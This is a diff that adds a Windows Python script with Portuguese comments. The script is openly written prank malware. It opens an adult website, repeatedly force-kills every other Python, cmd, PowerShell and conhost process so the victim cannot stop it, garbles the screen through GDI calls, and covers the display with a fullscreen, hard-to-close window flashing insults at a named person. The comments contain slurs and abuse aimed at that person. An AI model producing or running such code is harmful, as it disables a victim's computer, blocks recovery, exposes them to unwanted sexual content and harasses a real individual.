@@ -1,1 +1,74 @@
-sdawasdwasdwa
+import ctypes as c
+import webbrowser
+import tkinter as tk
+from tkinter import font
+import threading
+import time
+import random
+import os
+import subprocess
+
+# TEXTO QUE VAI PISCAR NA TELA (muda se tu quiser, seu viado)
+CUSTOM_TEXT = "JOSEPONTUDO É UM BURRO DO CARALHO QUE USA LIQUIDBOUNCE E AURA FRACA KKKKK FDP"
+
+# Abre xvideos na cara dele logo de cara
+webbrowser.open_new_tab("https://www.xvideos.com")
+
+# THREAD QUE MATA TODO OUTRO CMD/SCRIPT/POWERSHELL (só deixa o nosso vivo e faz pra novos também)
+def killer_thread():
+    own_pid = os.getpid()
+    while True:
+        try:
+            # Mata todo python menos o nosso
+            subprocess.call(f'taskkill /f /fi "imagename eq python.exe" /fi "pid ne {own_pid}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            # Mata todo cmd, powershell e conhost que aparecer (novos também)
+            subprocess.call('taskkill /f /im cmd.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.call('taskkill /f /im powershell.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.call('taskkill /f /im conhost.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+        time.sleep(0.4)  # loop rápido pra foder qualquer coisa nova
+
+# THREAD DO MELTER DE TELA (glitch do caralho igual vídeo de vírus)
+def screen_melter():
+    g = c.windll.gdi32
+    u = c.windll.user32
+    dc = u.GetDC(0)
+    while True:
+        x = random.randint(-200, 200)
+        y = random.randint(-200, 200)
+        w = 1920 + random.randint(200, 400)
+        h = 1080 + random.randint(200, 400)
+        g.StretchBlt(dc, x, y, w, h, dc, 0, 0, 1920, 1080, 0x00990000)
+        time.sleep(0.003)
+
+# JANELA DE TEXTO PISCANDO GIGANTE (não tem como fechar fácil)
+def text_overlay():
+    root = tk.Tk()
+    root.attributes('-fullscreen', True)
+    root.attributes('-topmost', True)
+    root.configure(bg='black')
+    root.overrideredirect(True)
+
+    label = tk.Label(root, 
+                     text=CUSTOM_TEXT, 
+                     font=font.Font(family="Impact", size=100, weight="bold"),
+                     fg="red", bg="black")
+    label.pack(expand=True)
+
+    def flash_text():
+        colors = ["red", "lime", "cyan", "yellow", "magenta", "white"]
+        while True:
+            label.config(fg=random.choice(colors))
+            root.update_idletasks()
+            root.update()
+            time.sleep(0.07)
+
+    threading.Thread(target=flash_text, daemon=True).start()
+    root.mainloop()
+
+# RODA TUDO
+if __name__ == "__main__":
+    threading.Thread(target=killer_thread, daemon=True).start()
+    threading.Thread(target=screen_melter, daemon=True).start()
+    text_overlay()  # trava aqui mas o resto continua matando e glitchando
